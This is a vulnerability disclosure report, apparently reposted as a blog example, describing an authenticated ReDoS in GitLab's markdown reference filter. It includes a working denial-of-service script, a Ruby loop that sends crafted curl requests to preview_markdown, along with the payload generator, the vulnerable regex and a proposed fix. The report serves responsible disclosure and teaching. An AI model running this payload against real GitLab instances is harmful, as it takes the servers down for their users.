---
title: "GitLab ReDoS"
date: 2023-08-01
description: "An authenticated ReDoS in GitLab's markdown reference filter"
---

## Disclaimer

This report is presented here as an example for my ReDoS blog post.
The vulnerability in question is fixed as of now, however I didn't pay attention to the exact commit that contained that fix. This is my report from summer 2023 to a GitLab VDP on HackerOne, the report was marked as "informative" by GitLab team, even tho the vulnerability was completely valid and had a high impact, judging by gitlab's CVSS calculator referencing GitLab's reference_architectures page for DoS impact calculation. GitLab team explained the "informative" mark by saying that the "component" (I assume they meant the markdown parser) is being internally assessed and they are not accepting external reports WRT it. Tho i had a strong feeling they didn't even look at the report, I decided to move on as I didn't wanna waste my time contacting HackerOne support.


## Summary

Requests to the `preview_markdown` API endpoint with specifically crafted request bodies result in the instance-holder server experiencing high CPU usage, ultimately leading to a DoS condition.


## Steps to reproduce

Before reproducing the issue, ensure that you have `ruby` and `curl` installed. 

1. Set up a local GitLab instance for testing to prevent interruptions on public GitLab instances, as the attack being reproduced leads to a DoS. (Although not necessary, I recommend reading the 'impact' section, as it provides more precise information on instance setup and reproducing the attack.)
2. Create an account and a group under this account.
![Group creation](/images/group.png)

!!! During registration, you have to approve your useraccount through the admin panel, you can determine the root account password using the following command (change the gitlab_local_1 to the appropriate instance name set during docker-run via --name parameter):
```bash
sudo docker exec -it gitlab_local_1 grep 'Password:' /etc/gitlab/initial_root_password
# Password: qeJsjzKXm9EVs4erNY4+z9gnqxTQvAOZ7P6TP61w6uI=
```
![Admin approval](/images/approve.png)

3. Use browser devtools to copy the `csrf-token` from page sources and the `_gitlab_session` cookie value from storage. Alternatively, intercept the request using a proxy like BurpSuite to obtain these values.
![CSRF token](/images/csrf.png)

![Session cookie](/images/session.png)

4. Download the provided payload attached as a JSON file, navigate to the directory where it's downloaded and execute following command (replace placeholders with actual values):
```bash
ruby -e 'while true do p spawn("curl -H \"Content-Type: application/json\" -H \"X-CSRF-Token: [CSRF_TOKEN]\" -H \"Cookie: _gitlab_session=[GITLAB_SESSION]\" --data @reference_pattern_dos.json http://[LOCAL_GITLAB_INSTANCE]/[GROUP_NAME]/preview_markdown"); sleep 1 end'
```
Alternatively, you can use the following command to craft an identical payload:
```bash
ruby -e 'File.open("reference_pattern_dos.json", "w") { |file| file.write("{\"text\":\"" + "aaaaaaaaa/" * 1_000_000 + "\"}") }'
```

5. Attempt to navigate to any page on the GitLab instance. At first, you might notice slow response times. These will soon be accompanied by the server becoming completely unresponsive. Eventually, you will start receiving HTTP responses with 500 status codes. 
![Request timeout](/images/timeout.png)

![500 error](/images/500.png)

![500 error (CLI)](/images/500_cli.png)


## What is the current bug behavior?

The regular expression used to filter user input in markdown fields does not execute in exponential time. However, under specific conditions, it triggers severe backtracking due to the lack of limiting the number of captured group iterations, despite having the `{,20}` quantifier. Even a string with only 4,000 characters might require over 2,000,000 steps to process. The problematic regex is defined as the `@object_reference_pattern` instance variable within `/lib/banzai/filter/references/reference_filter.rb`.
```ruby
def object_reference_pattern
@object_reference_pattern ||= object_class.reference_pattern
end
```

It's subsequently used in the context of processing user input in `/lib/banzai/filter/references/reference_filter.rb:209` in `!pattern.match?(node.text)`
```ruby
208 def replace_text_when_pattern_matches(node, index, pattern) 
209   return if pattern.is_a?(Gitlab::UntrustedRegexp) && !pattern.match?(node.text) 
210   return if pattern.is_a?(Regexp) && !(pattern =~ node.text)
```
!!! This is later being used in line 50 in /lib/banzai/filter/references/reference_filter.rb (e.g. replace_text_when_pattern_matches function with @object_reference_pattern variale passed to it as a "pattern" argument)

If we pass a single malicious string - `node.text` will be the value of a `text` json key i.e. the string that we provided, which is being passed in the http request body.

Example of `reference_pattern` regexp in `Epic` iteration:
```
((?x-mi:(?<!\w)(?<group>(?-mix:((?-mix:(?:[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]{0,254}[a-zA-Z0-9_\-]|[a-zA-Z0-9_])(?-mix:(?<!\.git|\.atom)))\/){0,20}(?-mix:(?:[a-zA-Z0-9_\.][a-zA-Z0-9_\-\.]{0,254}[a-zA-Z0-9_\-]|[a-zA-Z0-9_])(?-mix:(?<!\.git|\.atom)))))))?(?:(?-mix:&|&amp;))(?-mix:(?<epic>\d+)(?<format>\+s{0,1})?)
```
!!! This is obtained at execution time, this regexp is being constructed dinamically.


## What is the expected correct behavior?

To address this vulnerability, the regex should be fixed to prevent dangerous backtracking or used within a safe context, for example:
```ruby
ref_pattern_anchor = /\A#{ref_pattern}\z/
```
Here, `ref_pattern_anchor` variable is defined by embeding `reference_pattern` in safe context and used later in `abstract_reference_filter.rb`  


## Results of GitLab environment info

```bash
root@58ff34f8956f:/# gitlab-rake gitlab:env:info

System information
System:		
Current User:	git
Using RVM:	no
Ruby Version:	3.0.6p216
Gem Version:	3.4.18
Bundler Version:2.4.18
Rake Version:	13.0.6
Redis Version:	7.0.12
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	16.3.0
Revision:	85a896db163
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	13.11
URL:		http://58ff34f8956f
HTTP Clone URL:	http://58ff34f8956f/some-group/some-project.git
SSH Clone URL:	git@58ff34f8956f:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers: 

GitLab Shell
Version:	14.26.0
Repository storages:
- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell

Gitaly
- default Address: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
- default Version: 	16.3.0
- default Git Version: 	2.41.0.gl1
```


## Impact

When a GitLab instance is targeted at a well-tuned RPS rate for a certain duration, the server's response time is drastically affected. Each request takes over 60 seconds to process, resulting in a consistent stream of 500 responses.
According to the provided "Clarifying notes" "The number of requests must be fewer than the "test request per seconds rates" and cause 10+ seconds of user-perceivable unavailability to rate the impact as `A:H`".

In my opinion, based on the CVSS score calculation, the vulnerability rates as follows::
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H
```
- `PR:L` - The `preview_markdown` API endpoint is accessible only to authenticated users.
- `S:C` - The impact extends beyond the exploitable component, affecting the entire GitLab instance.
- `A:H` - Access is denied to a critical resource or the entire system is affected. Conditions `Runners all stop picking up pipelines` and `1k+ reference architecture GitLab instance taken down with requests per seconds (RPS) < reference RPS` are met.

Referring to the Clarifying Notes ([https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes]://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes)), the RPS rate during my local testing did not surpass the test rates. I utilized a `500 users | 4 vCPU` Docker instance, achieving an effective RPS of 1. As a result, the vulnerability meets the `S:C` criteria.
You can verify this by launching a Docker container using the `docker run` command with the `--cpus="4"` flag as shown below:
```bash
sudo docker run --detach \
--publish 4443:443 --publish 8880:80 --publish 2222:22 \
--name gitlab_local_1 \
--volume $GITLAB_HOME/config:/etc/gitlab \
--volume $GITLAB_HOME/logs:/var/log/gitlab \
--volume $GITLAB_HOME/data:/var/opt/gitlab \
--shm-size 2gb \
--cpus="4" \
gitlab/gitlab-ce:latest
```
Afterwards, adjust the `sleep` value in the 4th step of the "Steps to Reproduce" section accordingly. For my `4vCPU` instance, the `sleep` value should not exceed `1RPS`, thus I used `sleep 1` for testing purposes.

Conducting tests with a 1RPS rate on my instance yields the following outcome: while the malicious command is executing, attempting to access any page within any context of the instance will result in a 500 response status code from the server.

Additionaly here are the runner logs from the affected container:
```
$ sudo docker logs -n 4 -f gitlab-runner-name
WARNING: Checking for jobs... failed                runner=zV58SJ9o status=502 Bad Gateway
WARNING: Checking for jobs... failed                runner=zV58SJ9o status=502 Bad Gateway
WARNING: Checking for jobs... failed                runner=zV58SJ9o status=502 Bad Gateway
WARNING: Checking for jobs... failed                runner=zV58SJ9o status=502 Bad Gateway
```
